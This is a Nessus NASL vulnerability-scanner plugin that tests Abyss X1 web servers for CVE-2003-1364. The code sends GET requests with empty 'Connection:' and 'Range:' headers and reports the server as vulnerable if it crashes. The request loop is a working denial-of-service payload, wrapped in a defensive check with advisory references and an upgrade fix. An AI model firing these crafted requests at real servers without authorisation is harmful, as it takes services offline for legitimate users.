#
#
# (C) Tenable Network Security, Inc.
#
# References:
# Date: Sat, 5 Apr 2003 12:21:48 +0000
# From: Auriemma Luigi <aluigi@pivx.com>
# To: bugtraq@securityfocus.com, vulnwatch@vulnwatch.org,
#        full-disclosure@lists.netsys.com, list@dshield.org
# Subject: [VulnWatch] Abyss X1 1.1.2 remote crash
# 

include("compat.inc");

if(description)
{
 script_id(11521);
 script_cve_id("CVE-2003-1364");
 script_bugtraq_id(7287);
 script_xref(name:"OSVDB", value:"2226");
 script_xref(name:"Secunia", value:"8528");
 script_version ("$Revision: 1.13 $");
 script_name(english:"Abyss Web Server Malformed GET Request Remote DoS");
 script_summary(english:"Empty HTTP request headers crash the remote web server");

 script_set_attribute(attribute:"synopsis",value:
"The remote web server is vulnerable to a denial of service attack.");

 script_set_attribute(attribute:"description",value:
"It was possible to kill the remote web server by sending empty HTTP
request headers (namely Connection: and Range: ).

An attacker may use this flaw to crash the affected application, thereby
denying service to legitimate users.");

 script_set_attribute(attribute:"see_also",value:
"http://archives.neohapsis.com/archives/bugtraq/2003-04/0095.html");
 
 script_set_attribute(attribute:"solution",value:
"Upgrade to version 1.1.4 or higher, as it has been reported to fix
this vulnerability.");

 script_set_attribute(attribute:"cvss_vector",value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
script_end_attributes();

 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencies("find_service1.nasl", "no404.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if ( ! banner || "Abyss/" >!< banner ) exit(0);

if(http_is_dead(port:port))exit(0);

foreach h (make_list("Connection", "Range",  ""))
{
  req = strcat( 'GET / HTTP/1.0\r\n',  h, ': \r\n\r\n');

  r = http_send_recv_buf(port:port, data: req);

  if (http_is_dead(port: port))
  {
    security_warning(port);
    exit(0);
  } 
}

